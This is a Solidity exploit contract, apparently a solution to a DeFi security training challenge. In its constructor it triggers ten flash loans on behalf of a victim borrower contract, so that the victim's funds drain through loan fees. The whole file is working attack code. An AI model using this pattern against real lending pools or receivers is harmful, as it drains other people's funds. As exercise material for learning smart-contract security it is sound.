// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";


contract NaiveReceiverAttacker {
    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    constructor(IERC3156FlashLender pool, IERC3156FlashBorrower victim) {
        uint256 i = 0;
        while (i < 10) {
            pool.flashLoan(victim, ETH, 1, "0x");
            unchecked {
                i++;
            }
        }
    }
}
